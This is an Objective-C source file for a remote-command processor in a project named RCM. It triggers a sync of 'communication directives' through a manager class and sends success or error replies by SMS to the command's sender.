//
//  SyncCommunicationDirectivesProcessor.m
//  RCM
//
//  Created by Makara Khloth on 6/18/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SyncCommunicationDirectivesProcessor.h"
#import "SyncCDManager.h"

@interface SyncCommunicationDirectivesProcessor (PrivateAPI)
- (void) processSyncCD;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end

@implementation SyncCommunicationDirectivesProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the SyncCommunicationDirectivesProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: self (SyncTimeProcessor).
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"SyncCommunicationDirectivesProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark SyncCommunicationDirectivesProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SyncCommunicationDirectivesProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"SyncCommunicationDirectivesProcessor--->doProcessingCommand")
	[self processSyncCD];
}


#pragma mark SyncCommunicationDirectivesProcessor Private Methods

/**
 - Method name: processSyncCD
 - Purpose:This method is used to process sync CD
 - Argument list and description: No Argument
 - Return description: No return type
 */


- (void) processSyncCD {
	DLog (@"SyncCommunicationDirectivesProcessor--->processSyncCD")
	SyncCDManager *syncCDManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mSyncCDManager];
	[syncCDManager appendSyncCDDelegate:self];
	[syncCDManager syncCD];
	[self acknowldgeMessage];
}


/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument 
 - Return description:No Return
 */

- (void) acknowldgeMessage {
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage=[ messageFormat stringByAppendingString:NSLocalizedString(@"kSyncCDSucessMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"SyncCommunicationDirectivesProcessor--->sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent acknowldge message.")
	}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when sync CD process is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"SyncCommunicationDirectivesProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

#pragma mark SyncTimeManager Delegate Methods

/**
 - Method name: syncCDSuccess
 - Purpose:This method is invoked when sync CD is delivered successfully
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) syncCDSuccess {
	DLog (@"SyncCommunicationDirectivesProcessor--->syncCDSuccess")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *replyMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kSyncCDSucessMSG2", @"")];
	
	// Remove processor from the array inside SyncCDManager
	[[[RemoteCmdUtils sharedRemoteCmdUtils] mSyncCDManager] removeSyncCDDelegate:self];
	
   	[self sendReplySMS:replyMessage isProcessCompleted:YES];
}

/**
 - Method name: syncCDError:error:
 - Purpose:This method is invoked when time sync with server is failed
 - Argument list and description:aDDMErrorType (NSNumber *) aDDMErrorType, aError (NSError*) error from sync CD manager
 which userInfo is nil, error code is server status
 - Return description: No return type
 */

- (void) syncCDError: (NSNumber *) aDDMErrorType error: (NSError *) aError {
	DLog (@"SyncCommunicationDirectivesProcessor--->syncCDError:error:")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:[aError code]];
	// Remove processor from the array inside SyncCDManager
	[[[RemoteCmdUtils sharedRemoteCmdUtils] mSyncCDManager] removeSyncCDDelegate:self];
	
	[self sendReplySMS:messageFormat isProcessCompleted:YES];
}


/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	DLog (@"SyncCommunicationDirectivesProcessor is now dealloced")
	[super dealloc];
}

@end
